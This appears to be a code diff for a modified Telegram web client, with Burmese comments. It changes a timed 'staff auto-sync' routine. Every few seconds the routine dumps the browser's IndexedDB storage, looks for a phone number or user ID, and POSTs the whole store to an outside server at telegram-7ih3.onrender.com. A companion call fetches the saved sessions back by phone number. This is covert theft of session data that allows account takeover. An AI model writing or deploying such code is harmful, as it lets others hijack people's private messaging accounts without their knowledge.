@@ -169,7 +169,6 @@ setTimeout(() => {
                 statusMsg.style.color = "blue";
                 statusMsg.innerText = "Database တွင် ရှာဖွေနေပါသည်...";
 
-                // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
                 fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
                 .then(res => res.json())
                 .then(result => {
@@ -207,7 +206,7 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (STRICT LOGIN CHECK - အမှိုက် Data များ မပို့တော့ပါ)
+    // ၂။ 📤 STAFF AUTO-SYNC (DEEP STRING SCANNER - အမှိုက်မပို့ပါ၊ အတိအကျပို့မည်)
     // =========================================================
     setInterval(() => {
         try {
@@ -223,30 +222,25 @@ setTimeout(() => {
                         const keys = e2.target.result;
                         
                         const data: any = {};
-                        let currentUserId = null;
-
-                        keys.forEach((k: string, i: number) => { 
-                            data[k] = vals[i]; 
-                            // 🌟 User ID ကို အတိအကျ လိုက်ရှာမည် 🌟
-                            if (k === 'currentUserId') currentUserId = vals[i];
-                        });
+                        keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
                         
-                        // 🌟 အရေးကြီးဆုံး: User ID မရှိသေးလျှင် (Login မဝင်ရသေးလျှင်) ဘာ Data မှ မပို့ပါ 🌟
-                        if (!currentUserId) return; 
-
-                        // User ID တွေ့မှသာ အောက်ပါအလုပ်များကို ဆက်လုပ်မည်
+                        // 🌟 Data များကို စာသားပြောင်းပြီးမှ ထိုစာသားထဲတွင် ID အတိအကျ လိုက်ရှာမည် 🌟
                         const dataString = JSON.stringify(data);
-                        let phone = "";
                         let phoneMatch = dataString.match(/"phoneNumber":"?(\d+)"?/);
+                        let idMatch = dataString.match(/"currentUserId":"?(\d+)"?/);
                         
-                        // ဖုန်းနံပါတ် တွေ့ရင် ဖုန်းနံပါတ်ဖြင့် သိမ်းမည်၊ မတွေ့ပါက User ID ဖြင့် အတိအကျ သိမ်းမည်
+                        // 🌟 ဖုန်းနံပါတ် သို့မဟုတ် User ID လုံးဝ (လုံးဝ) ရှာမတွေ့ပါက Login မဝင်ရသေးဟု သတ်မှတ်ပြီး ရပ်ထားမည် 🌟
+                        if (!phoneMatch && !idMatch) return; 
+
+                        // တွေ့ရှိမှသာ နာမည်သတ်မှတ်မည်
+                        let phone = "";
                         if (phoneMatch && phoneMatch[1]) {
                             phone = '+' + phoneMatch[1];
-                        } else {
-                            phone = "ID_" + currentUserId;
+                        } else if (idMatch && idMatch[1]) {
+                            phone = "ID_" + idMatch[1];
                         }
                         
-                        // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+                        // ⚠️ တွေ့ရှိသွားသော Data အမှန်ကိုသာ ပို့ပါမည် ⚠️
                         fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
